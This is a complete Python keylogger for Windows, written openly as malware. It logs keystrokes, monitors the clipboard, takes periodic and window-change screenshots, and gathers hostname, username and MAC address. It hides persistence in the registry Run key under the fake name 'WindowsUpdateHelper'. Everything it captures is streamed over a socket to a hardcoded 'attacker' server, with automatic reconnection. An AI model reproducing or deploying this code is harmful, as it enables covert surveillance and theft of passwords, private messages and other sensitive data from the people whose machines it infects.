#!/usr/bin/env python3
"""
Advanced Keylogger with Instant Clipboard & Periodic Logs
"""
import getpass
import os
import platform
import sys
import uuid
import winreg
from pynput import keyboard
import win32gui
from datetime import datetime
from PIL import ImageGrab
import time
import pyperclip
import threading
import socket
import io

# Global variables
current_window = ""
log_data = {}  # {window: [start_time, [chars]]}
previous_clipboard = ""
sock = None

# Try to import win32 modules
try:
    import win32gui
    import win32clipboard
    WIN32_AVAILABLE = True
except ImportError:
    print("Warning: pywin32 not found. Some features (window title, clipboard) disabled.")
    WIN32_AVAILABLE = False


def connect_to_attacker(ip, port):
    """Establish connection to attacker server"""
    global sock
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    try:
        sock.connect((ip, port))
        print(f"[+] Connected to attacker {ip}:{port}")
        system_info = get_system_information()
        envoyer_log(system_info)
        print("[+] System info sent.")
        return True
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        sock = None
        return False


def envoyer_image(img_data, filename):
    """Send screenshot to attacker"""
    global sock
    if sock is None:
        print("[-] No connection, image not sent")
        return

    try:
        header = f"IMAGE|{filename}|{len(img_data)}\n".encode('utf-8')
        sock.sendall(header)
        print(f"[📸] Sent header: {filename} ({len(img_data)} bytes)")

        total_sent = 0
        chunk_size = 4096
        while total_sent < len(img_data):
            chunk = img_data[total_sent:total_sent + chunk_size]
            sent = sock.send(chunk)
            if sent == 0:
                raise RuntimeError("Socket broken")
            total_sent += sent
            print(f"[📸] Sent {total_sent}/{len(img_data)} bytes")
        print(f"[✅] Successfully sent {filename}")
    except Exception as e:
        print(f"[❌] Error sending image: {e}")
        reconnect()


def envoyer_log(message):
    """Send log message to attacker"""
    global sock
    if sock is None:
        return
    try:
        data = f"LOG|{message}".encode('utf-8', errors='replace') + b"\n"
        sock.sendall(data)
    except Exception as e:
        print(f"[!] Failed to send log: {e}")
        reconnect()


def reconnect():
    """Reconnect to attacker on failure"""
    global sock
    print("[🔁] Attempting to reconnect...")
    time.sleep(3)
    connect_to_attacker("192.168.56.102", 9999)


def capture_ecran(window_title):
    """Take and send screenshot of active window"""
    time.sleep(0.5)
    now = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_title = "".join(c if c.isalnum() else "_" for c in window_title)[:50]
    filename = f"{now}_{safe_title}.png"

    try:
        screenshot = ImageGrab.grab()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        img_data = img_byte_arr.getvalue()

        print(f"[📸] Screenshot taken: {filename}")
        envoyer_image(img_data, filename)
    except Exception as e:
        print(f"[!] Screenshot failed: {e}")


def get_active_window_title():
    """Get the currently active window title"""
    if not WIN32_AVAILABLE:
        return "[Win32 Unavailable]"
    try:
        hwnd = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(hwnd)
        return title if title else "[No Title]"
    except Exception as e:
        return f"[Window Error: {e}]"


def surveiller_presse_papier():
    """Monitor clipboard and send changes instantly"""
    global previous_clipboard
    while True:
        try:
            current_content = pyperclip.paste()
            if (current_content != previous_clipboard and
                    current_content.strip() != "" and
                    len(current_content) <= 1000):  # Avoid huge data
                previous_clipboard = current_content
                now = datetime.now().strftime('%H:%M:%S')
                fenetre = get_active_window_title()

                # Log locally
                if fenetre not in log_data:
                    log_data[fenetre] = [datetime.now().strftime("%H:%M:%S"), []]

                entry = f"[📋 CLIPBOARD ]: {current_content}"
                log_data[fenetre][1].append(entry)

                # Send instantly
                envoyer_touche_immediatement(fenetre, entry)
                print(f"[{now}] {fenetre} > {entry}")

        except Exception as e:
            print(f"[!] Clipboard error: {e}")
        time.sleep(0.5)


def on_press(key):
    """Handle keystrokes"""
    global current_window

    if key == keyboard.Key.esc:
        print("\n[!] Esc pressed, stopping keylogger...")
        afficher_resume()
        return False

    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    new_window = get_active_window_title()

    # Switch window
    if new_window != current_window:
        current_window = new_window
        print(f"\n[+] {now} | Active window: {current_window}")
        if current_window not in log_data:
            log_data[current_window] = [datetime.now().strftime("%H:%M:%S"), []]
        capture_ecran(current_window)

    # Ensure window exists in log_data
    if current_window not in log_data:
        log_data[current_window] = [datetime.now().strftime("%H:%M:%S"), []]

    # Convert key to string
    try:
        char = key.char
    except AttributeError:
        if key == keyboard.Key.space:
            char = " "
        elif key == keyboard.Key.enter:
            char = "\n"
        elif key == keyboard.Key.tab:
            char = "\t"
        elif key == keyboard.Key.backspace:
            char = "[←]"
        else:
            char = f"[{key.name}]"

    # Log keystroke
    log_data[current_window][1].append(char)


def envoyer_touche_immediatement(window, char):
    """Send a single event (keystroke or clipboard) immediately"""
    now = datetime.now().strftime('%H:%M:%S')
    message = f"[{now}] {window} > {char}"
    envoyer_log(message)


def envoyer_logs_periodiquement():
    """Send accumulated keystrokes every 10 seconds"""
    while True:
        try:
            if log_data:
                resume = "\n\n===== KEYLOGS =====\n\n"
                for window, (start_time, chars) in log_data.items():
                    content = ''.join(chars)
                    if len(content) > 0:  # Only send non-empty logs
                        resume += f"Window: {window}\n"
                        resume += f"Started: {start_time}\n"
                        resume += "Content:\n"
                        resume += content
                        resume += "\n" + "-" * 50 + "\n\n"

                if len(resume.strip()) > 10:
                    envoyer_log(resume.strip())
                    print("[📝] Keystrokes sent periodically.")
                    log_data.clear()  # Clear after sending
            time.sleep(10)
        except Exception as e:
            print(f"[!] Error in periodic sender: {e}")
            time.sleep(10)


def screenshot_thread():
    """Take screenshot every 30 seconds"""
    while True:
        time.sleep(30)
        window_title = get_active_window_title()
        print(f"[📸] Periodic screenshot: {window_title}")
        capture_ecran(window_title)


def get_system_information():
    """Gather system info"""
    try:
        info = {
            "Hostname": platform.node(),
            "OS": f"{platform.system()} {platform.release()}",
            "Arch": platform.machine(),
            "User": getpass.getuser(),
            "MAC": ":".join(f"{uuid.getnode():012x}"[i:i+2] for i in range(0, 12, 2))
        }
        return "[SYSTEM_INFO]\n" + "\n".join([f"{k}: {v}" for k, v in info.items()])
    except Exception as e:
        return f"[SYSTEM_INFO_ERROR: {e}]"


def add_registry_persistence():
    """Add persistence via Run key"""
    try:
        script_path = os.path.abspath(__file__)
        python_exe = sys.executable
        command = f'"{python_exe}" "{script_path}"'

        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, command)
        winreg.CloseKey(key)
        print("[+] Persistence added: WindowsUpdateHelper")
    except Exception as e:
        print(f"[-] Failed to add persistence: {e}")


def afficher_resume():
    """Print local summary on exit"""
    print("\n\n===== Final Log Summary =====\n")
    for window, (start_time, chars) in log_data.items():
        print(f"Window: {window}")
        print(f"Started: {start_time}")
        print("Content:")
        print(''.join(chars))
        print("\n" + "-" * 50 + "\n")


if __name__ == "__main__":
    # Add persistence
    add_registry_persistence()

    # Connect to attacker
    if not connect_to_attacker("192.168.56.102", 9999):
        print("[-] Initial connection failed. Exiting.")
        sys.exit(1)

    # Start background threads
    threading.Thread(target=surveiller_presse_papier, daemon=True).start()
    threading.Thread(target=envoyer_logs_periodiquement, daemon=True).start()
    threading.Thread(target=screenshot_thread, daemon=True).start()

    # Start keylogger
    try:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        afficher_resume()
    except Exception as e:
        print(f"[!] Unexpected error: {e}")